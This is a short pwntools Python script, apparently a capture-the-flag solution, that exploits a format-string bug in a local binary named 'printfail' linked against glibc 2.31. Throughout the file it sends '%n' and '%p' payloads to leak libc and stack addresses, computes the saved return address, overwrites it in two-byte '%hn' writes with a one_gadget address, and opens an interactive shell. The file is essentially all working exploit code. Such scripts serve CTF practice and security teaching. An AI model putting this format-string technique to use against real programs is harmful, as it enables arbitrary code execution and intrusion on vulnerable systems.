#!/usr/bin/env python3

from pwn import *

exe = ELF("./printfail_patched")
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
ld = ELF("./ld-2.31.so")
p = process([exe.path])

context.binary = exe

gdb.attach(p, gdbscript = '''
b*run_round+75
b*run_round+132
c 
''')

input()

payload = b'%1c%7$n%13$p|'
# payload = payload.ljust(512, b'\0')
# p.sendlineafter(b'No do-overs.\n', payload)
p.sendline(payload)
# p.recvuntil(b'chance.\n')
p.recvline()
p.recvuntil(b'1')
libc_leak = int(p.recvuntil(b'|',drop=True),16)
libc.address = libc_leak - 0x24083
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

payload = b'%1c%7$n%15$p|'
p.sendline(payload)
p.recvline()
p.recvuntil(b'1')
stack_leak = int(p.recvuntil(b'|',drop=True),16)
rip = stack_leak - 0xf0
log.info("stack leak: " + hex(stack_leak))
log.info("rip: " + hex(rip))

# payload = f'%1c%7$n%{(rip & 0xffff) - 1}c%6$hn'.encode()
# p.sendline(payload)

one_gadget = libc.address + 0xe3b01
log.info("one_gadget: " + hex(one_gadget))

for i in range(0, 2):
    rip += 2*i
    payload = f'%1c%7$n%{(rip & 0xffff) - 1}c%15$hn'.encode()
    p.sendline(payload)
    payload = f'%1c%7$n%{(one_gadget & 0xffff) - 1}c%43$hn'.encode()
    p.sendline(payload)
    one_gadget = one_gadget >> 16
    log.info("one_gadget: " + hex(one_gadget))


p.sendline(b'a')


p.interactive()